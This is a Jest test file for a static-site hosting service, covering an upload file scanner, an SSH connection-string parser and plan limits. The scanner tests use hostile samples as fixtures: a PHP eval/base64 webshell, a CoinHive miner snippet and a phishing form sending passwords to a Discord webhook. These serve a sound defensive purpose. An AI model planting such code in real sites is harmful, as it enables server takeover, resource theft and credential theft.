'use strict';
process.env.NODE_ENV = 'test';
process.env.DATABASE_PATH = ':memory:';
process.env.DOMAINS = 'test.example.com';
process.env.DEFAULT_DOMAIN = 'test.example.com';
process.env.SESSION_SECRET = 'test';
process.env.JWT_SECRET = 'test';

const { initDatabase, runMigrations, closeDatabase, getDb } = require('../../database/database');
const { scanFiles, scanZipBuffer } = require('../../src/services/fileScannerService');
const { parseNodeConnectionString } = require('../../src/services/nodeManagerService');
const { getTOS, getPlan, checkUserLimits } = require('../../src/services/hostingService');

beforeAll(() => {
  initDatabase();
  runMigrations();
  getDb().prepare("INSERT INTO users(tg_id, username, role) VALUES(1001, 'user1', 'user')").run();
  getDb().prepare("INSERT INTO users(tg_id, username, role) VALUES(9999, 'admin1', 'admin')").run();
});

afterAll(() => closeDatabase());

describe('File Scanner & Anti-Abuse Protection', () => {
  test('passes clean HTML, CSS, and JS files', () => {
    const cleanFiles = [
      { name: 'index.html', content: '<h1>My Portfolio</h1><p>Welcome to my static website!</p>' },
      { name: 'style.css', content: 'body { background: #000; color: #fff; }' },
      { name: 'app.js', content: 'console.log("Hello world"); document.getElementById("btn").onclick = () => alert("Hi");' }
    ];

    const result = scanFiles(cleanFiles);
    expect(result.safe).toBe(true);
    expect(result.violations.length).toBe(0);
  });

  test('blocks cryptocurrency miners (e.g. xmrig, stratum)', () => {
    const maliciousFiles = [
      { name: 'index.html', content: '<h1>Normal Page</h1>' },
      { name: 'worker.js', content: 'var miner = new CoinHive.Anonymous("test"); miner.start();' }
    ];

    const result = scanFiles(maliciousFiles);
    expect(result.safe).toBe(false);
    expect(result.violations.length).toBeGreaterThan(0);
    expect(result.violations[0].threat).toBe('crypto_miner');
  });

  test('blocks webshells and backdoors', () => {
    const webshell = [
      { name: 'c99.php', content: '<?php eval(base64_decode($_POST["cmd"])); ?>' }
    ];

    const result = scanFiles(webshell);
    expect(result.safe).toBe(false);
    expect(result.violations[0].threat).toBe('webshell');
  });

  test('blocks disallowed executable extensions', () => {
    const dangerousFiles = [
      { name: 'run.sh', content: '#!/bin/bash\necho test' },
      { name: 'payload.exe', content: 'binary' }
    ];

    const result = scanFiles(dangerousFiles);
    expect(result.safe).toBe(false);
    expect(result.violations.some(v => v.threat === 'blocked_extension')).toBe(true);
  });

  test('blocks Discord webhook credential stealers', () => {
    const phishingFile = [
      { name: 'login.html', content: '<form action="https://discord.com/api/webhooks/12345/abcdef"><input name="password">' }
    ];

    const result = scanFiles(phishingFile);
    expect(result.safe).toBe(false);
    expect(result.violations.some(v => v.threat === 'credential_stealer')).toBe(true);
  });
});

describe('Node Connection Parser', () => {
  test('parses host:port:user:pass', () => {
    const parsed = parseNodeConnectionString('viaduct.proxy.rlwy.net:12345:root:mysecret');
    expect(parsed.host).toBe('viaduct.proxy.rlwy.net');
    expect(parsed.port).toBe(12345);
    expect(parsed.username).toBe('root');
    expect(parsed.password).toBe('mysecret');
  });

  test('parses host:user:pass with default port 22', () => {
    const parsed = parseNodeConnectionString('192.168.1.100:ubuntu:pass123');
    expect(parsed.host).toBe('192.168.1.100');
    expect(parsed.port).toBe(22);
    expect(parsed.username).toBe('ubuntu');
    expect(parsed.password).toBe('pass123');
  });

  test('rejects invalid connection strings', () => {
    expect(() => parseNodeConnectionString('invalid')).toThrow(/Invalid connection format/i);
  });
});

describe('Hosting Plans & Limits', () => {
  test('returns default free plan', () => {
    const plan = getPlan('free');
    expect(plan.id).toBe('free');
    expect(plan.max_sites).toBe(1);
    expect(plan.max_storage_bytes).toBe(52428800); // 50MB
  });

  test('enforces plan limits for regular user', () => {
    const limits = checkUserLimits(1001, 'free');
    expect(limits.plan.id).toBe('free');
    expect(limits.canCreate).toBe(true);
  });

  test('grants unlimited capacity to administrator', () => {
    const limits = checkUserLimits(9999);
    expect(limits.canCreate).toBe(true);
    expect(limits.plan.max_sites).toBeGreaterThan(100);
  });

  test('retrieves anti-abuse Terms of Service', () => {
    const tos = getTOS();
    expect(tos.title).toBeDefined();
    expect(tos.content).toContain('Cryptocurrency miners');
    expect(tos.content).toContain('Phishing');
  });
});
